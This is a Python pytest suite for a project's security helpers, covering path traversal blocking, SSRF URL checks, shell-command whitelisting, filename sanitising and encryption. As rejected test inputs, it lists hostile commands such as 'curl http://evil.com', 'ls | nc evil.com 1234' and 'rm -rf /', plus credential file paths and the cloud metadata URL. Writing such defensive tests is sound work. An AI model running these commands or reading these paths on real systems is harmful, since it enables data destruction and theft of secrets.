"""
Axon by NeuroVexon - Security Tests

Tests for validate_path, validate_url, validate_shell_command, sanitize_filename,
encrypt_value, decrypt_value.
"""

import pytest
import sys
import os

# Add backend to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.security import (
    validate_path,
    validate_url,
    validate_shell_command,
    sanitize_filename,
    encrypt_value,
    decrypt_value,
    generate_session_id,
    generate_secret_key,
    hash_string,
)


class TestValidatePath:
    """Tests for path validation — must block path traversal and sensitive files"""

    def test_normal_path_allowed(self):
        assert validate_path("README.md") is True
        assert validate_path("./src/main.py") is True
        assert validate_path("outputs/result.txt") is True

    def test_path_traversal_blocked(self):
        assert validate_path("../../etc/passwd") is False
        assert validate_path("../../../root/.ssh/id_rsa") is False
        assert validate_path("foo/../../../etc/shadow") is False

    def test_absolute_system_paths_blocked(self):
        assert validate_path("/etc/passwd") is False
        assert validate_path("/etc/shadow") is False
        assert validate_path("/root/.bashrc") is False
        assert validate_path("/home/user/.ssh/id_rsa") is False
        assert validate_path("/proc/self/environ") is False
        assert validate_path("/sys/kernel/notes") is False
        assert validate_path("/var/log/auth.log") is False

    def test_windows_system_paths_blocked(self):
        assert validate_path("C:\\Windows\\System32\\config\\SAM") is False
        assert validate_path("C:\\Users\\admin\\Desktop") is False
        assert validate_path("c:/windows/system32") is False
        assert validate_path("c:/program files/test") is False

    def test_sensitive_files_blocked(self):
        assert validate_path(".env") is False
        assert validate_path("config/.env") is False
        assert validate_path(".ssh/id_rsa") is False
        assert validate_path(".git/config") is False
        assert validate_path("credentials.json") is False
        assert validate_path("secrets.yaml") is False
        assert validate_path("id_ed25519") is False


class TestValidateUrl:
    """Tests for URL validation — must block SSRF attacks"""

    def test_external_urls_allowed(self):
        assert validate_url("https://example.com") is True
        assert validate_url("https://api.github.com/repos") is True
        assert validate_url("http://duckduckgo.com/search") is True

    def test_localhost_blocked(self):
        assert validate_url("http://localhost/admin") is False
        assert validate_url("http://localhost:8000/api") is False
        assert validate_url("http://127.0.0.1/internal") is False
        assert validate_url("http://127.0.0.1:3000") is False

    def test_internal_ips_blocked(self):
        assert validate_url("http://10.0.0.1/api") is False
        assert validate_url("http://192.168.1.1/admin") is False
        assert validate_url("http://172.16.0.1/internal") is False
        assert validate_url("http://172.17.0.1:5432") is False

    def test_link_local_blocked(self):
        assert (
            validate_url("http://169.254.169.254/latest/meta-data") is False
        )  # AWS IMDS

    def test_ipv6_localhost_blocked(self):
        assert validate_url("http://[::1]/api") is False

    def test_file_protocol_blocked(self):
        assert validate_url("file:///etc/passwd") is False
        assert validate_url("file://C:/Windows/System32") is False

    def test_zero_ip_blocked(self):
        assert validate_url("http://0.0.0.0/admin") is False


class TestValidateShellCommand:
    """Tests for shell command validation — must prevent injection"""

    def test_whitelisted_commands_allowed(self):
        is_valid, _ = validate_shell_command("ls")
        assert is_valid is True

        is_valid, _ = validate_shell_command("ls -la")
        assert is_valid is True

        is_valid, _ = validate_shell_command("pwd")
        assert is_valid is True

        is_valid, _ = validate_shell_command("date")
        assert is_valid is True

    def test_non_whitelisted_commands_blocked(self):
        is_valid, error = validate_shell_command("rm -rf /")
        assert is_valid is False

        is_valid, error = validate_shell_command("curl http://evil.com")
        assert is_valid is False

        is_valid, error = validate_shell_command("wget http://malware.com")
        assert is_valid is False

    def test_command_chaining_blocked(self):
        is_valid, error = validate_shell_command("ls && rm -rf /")
        assert is_valid is False
        assert "&&" in error

        is_valid, error = validate_shell_command("ls || curl evil.com")
        assert is_valid is False

        is_valid, error = validate_shell_command("ls; rm -rf /")
        assert is_valid is False

        is_valid, error = validate_shell_command("ls | nc evil.com 1234")
        assert is_valid is False

    def test_command_substitution_blocked(self):
        is_valid, error = validate_shell_command("ls `curl evil.com`")
        assert is_valid is False

        is_valid, error = validate_shell_command("ls $(whoami)")
        assert is_valid is False

        is_valid, error = validate_shell_command("echo ${PATH}")
        assert is_valid is False

    def test_empty_command_blocked(self):
        is_valid, error = validate_shell_command("")
        assert is_valid is False

        is_valid, error = validate_shell_command("   ")
        assert is_valid is False


class TestSanitizeFilename:
    """Tests for filename sanitization"""

    def test_normal_filenames(self):
        assert sanitize_filename("report.txt") == "report.txt"
        assert sanitize_filename("data.csv") == "data.csv"

    def test_path_separators_removed(self):
        assert "/" not in sanitize_filename("../../etc/passwd")
        assert "\\" not in sanitize_filename("..\\..\\windows\\system32")

    def test_leading_dots_removed(self):
        result = sanitize_filename(".hidden")
        assert not result.startswith(".")

        result = sanitize_filename("..env")
        assert not result.startswith(".")

    def test_null_bytes_removed(self):
        assert "\x00" not in sanitize_filename("file\x00.txt")

    def test_long_filenames_truncated(self):
        long_name = "a" * 300 + ".txt"
        result = sanitize_filename(long_name)
        assert len(result) <= 255

    def test_empty_returns_unnamed(self):
        assert sanitize_filename("") == "unnamed"
        assert sanitize_filename("...") == "unnamed"


class TestEncryptDecrypt:
    """Tests for API key encryption/decryption"""

    def test_encrypt_decrypt_roundtrip(self):
        original = "sk-ant-api03-test-key-12345"
        encrypted = encrypt_value(original)

        assert encrypted != original
        assert encrypted != ""

        decrypted = decrypt_value(encrypted)
        assert decrypted == original

    def test_different_values_different_ciphertexts(self):
        enc1 = encrypt_value("key-1")
        enc2 = encrypt_value("key-2")
        assert enc1 != enc2

    def test_empty_value(self):
        assert encrypt_value("") == ""
        assert decrypt_value("") == ""

    def test_invalid_ciphertext_returns_empty(self):
        result = decrypt_value("not-valid-encrypted-data")
        assert result == ""


class TestUtilityFunctions:
    """Tests for utility security functions"""

    def test_session_id_is_random(self):
        id1 = generate_session_id()
        id2 = generate_session_id()
        assert id1 != id2
        assert len(id1) > 20

    def test_secret_key_is_random(self):
        key1 = generate_secret_key()
        key2 = generate_secret_key()
        assert key1 != key2
        assert len(key1) == 64  # 32 bytes hex

    def test_hash_string_deterministic(self):
        h1 = hash_string("test")
        h2 = hash_string("test")
        assert h1 == h2

    def test_hash_string_different_inputs(self):
        h1 = hash_string("test1")
        h2 = hash_string("test2")
        assert h1 != h2


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
